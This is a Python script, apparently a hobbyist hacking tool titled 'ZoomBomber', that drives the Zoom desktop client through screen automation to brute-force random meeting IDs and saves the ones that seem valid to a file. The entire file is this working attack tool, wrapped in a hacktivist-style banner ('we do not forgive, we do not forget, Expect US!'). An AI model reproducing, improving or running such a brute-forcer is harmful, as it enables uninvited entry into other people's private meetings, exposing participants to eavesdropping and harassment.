import os
import pyautogui
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import numpy as np
from time import sleep
from pyfiglet import Figlet
from colorama import *

class ZoomBomber:
    def __init__(self):
        f = Figlet()
        print(Fore.BLUE + f.renderText('ShameOnYou'))
        print(Fore.YELLOW + Back.BLUE+'[+] Zoom Meeting ID Brute Forcer Module by Muneeb Ahmad (C) MIT 2021')
        print('[+] We are Ottomans, we are a Legion, we do not forgive, we do not forget, Expect US!')
        self.Windows_Button = pyautogui.locateOnScreen('./Windows_Button.png')
        pyautogui.click(self.Windows_Button)
        pyautogui.typewrite('Zoom')
        pyautogui.press('enter')
        print(Fore.RED +'[+] Zoom Opened' + Fore.GREEN + '- Success')
        self.open_meeting = pyautogui.locateOnScreen('./Open_Meeting.png')
        print(f'Open Meeting Found on {self.open_meeting}')
        while None == self.open_meeting:
            print(Fore.LIGHTWHITE_EX + 'Zoom Join Meeting Not Found on' + Back.GREEN+ 'Screen')
            self.open_meeting = pyautogui.locateOnScreen('./Open_Meeting.png')
        pyautogui.click(self.open_meeting)
    def generate_link(self,type=11):
        # Debug Module - Link Generation Algorithm Information.
        if type == 9:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':personal_meeting_old standard')
        elif type == 10:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':personal_meeting_new')
        elif type == 11:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':scheduled_meeting')
        # This Function Generates a Link to Try to Test the Zoom Meeting
        numbers = np.arange(0,10,1)
        self.meeting_code = ''
        # Meeting ID Generation Info 3 Modes for Brute Forcing - :)
        self.meetings_dict = {
            'personal_meeting_old':9,
            'personal_meeting_new':10,
            'scheduled_meeting':11
        }
        for x in range(type):
            s = str(random.choice(numbers))
            self.meeting_code = self.meeting_code + s
        print(self.meeting_code)
        return self.meeting_code
    def check_link(self):
        link = self.generate_link()
        sleep(1)
        try:
            join_again_case = pyautogui.locateOnScreen('./Open_Meeting.png')
            pyautogui.click(join_again_case)
        except:
            print(Fore.RED + Back.BLUE +'[+] Seems Like it is First RUN')
        self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
        while self.enter_meeting == None:
            self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
            print(f'Enter Meeting Status on Screen {self.enter_meeting}')
        pyautogui.click(self.enter_meeting)
        pyautogui.typewrite(f'{link}')
        pyautogui.press('enter')
        print(Back.WHITE + Fore.GREEN +'[+] Now Sleeping for 8 Seconds :)')
        sleep(8)
        try:
            self.invalid_loc = pyautogui.locateOnScreen('./Invalid_ID_Force.png')
            if self.invalid_loc != None:
                ok_location = pyautogui.locateOnScreen('./Ok_Button.png')
                pyautogui.click(ok_location)
                return False
        except:
            self.invalid_loc = pyautogui.locateOnScreen('./Invalid_ID.png')
            if self.invalid_loc != None:
                ok_location = pyautogui.locateOnScreen('./Ok_Button.png')
                pyautogui.click(ok_location)
                return False
            else:
                print('[+] Correct Meeting ID Found - Failsafe unactivated')
                with open('Zoom-Meetings.txt', 'a+') as f:
                    f.write(f'{link}\n')
                return True





if __name__ == '__main__':
    Bomber = ZoomBomber()
    Status = False
    while Status == False:

        Status = Bomber.check_link()
        if Status == False:
            print('Attempt Failed')
        if Status == True:
            fail_safe = pyautogui.locateOnScreen('./Invalid_ID.png')
            if fail_safe != None:
                print(Fore.RED + Back.WHITE + "URGENT: FAILSAFE CONFIRMS IT IS NOT WORKING [BAD]")
                Status = False
            elif fail_safe == None:
                print(Fore.RED + Back.WHITE + "URGENT: FAILSAFE CONFIRMS IT IS WORKING [GOOD]")




